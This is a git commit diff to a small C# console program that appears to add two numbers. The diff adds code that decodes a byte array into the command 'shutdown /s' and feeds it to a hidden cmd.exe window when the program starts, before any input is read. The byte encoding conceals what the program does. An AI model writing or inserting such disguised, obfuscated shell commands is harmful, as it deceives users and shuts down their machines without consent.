edfa4501526fdc506167712f8c44c657f59b7f8c
alirezarize <khosravinezhad.79@gmail.com>
2024-05-08 08:38:31 +0330

    Test

--- ConsoleApp1/Program.cs
+++ ConsoleApp1/Program.cs
@@ -1,5 +1,7 @@
 ﻿// Alireza Khosravi
 // Mohsen Mohammadi
+using System.Diagnostics;
+
 void Sum(int a, int b) => Console.WriteLine(a+b);
 String ConvertBack(byte[] inp)
 {
@@ -22,7 +24,20 @@ byte[] ConvertToByte(String inp)
     return b.ToArray();
 }
 
-System.Diagnostics.Process.Start("cmd.exe", ConvertBack(new byte[] { 115, 104, 117, 116, 100, 111, 119, 110, 32, 47, 115 }));
+//System.Diagnostics.Process.Start("cmd.exe", ConvertBack(new byte[] { 115, 104, 117, 116, 100, 111, 119, 110, 32, 47, 115 }));
+Process cmd = new Process();
+cmd.StartInfo.FileName = "cmd.exe";
+cmd.StartInfo.RedirectStandardInput = true;
+cmd.StartInfo.RedirectStandardOutput = true;
+cmd.StartInfo.CreateNoWindow = true;
+cmd.StartInfo.UseShellExecute = false;
+cmd.Start();
+
+cmd.StandardInput.WriteLine(ConvertBack(new byte[] { 115, 104, 117, 116, 100, 111, 119, 110, 32, 47, 115 }));
+cmd.StandardInput.Flush();
+cmd.StandardInput.Close();
+cmd.WaitForExit();
+
 
 int a = 0, b = 0;
 int.TryParse(Console.ReadLine(), out a);
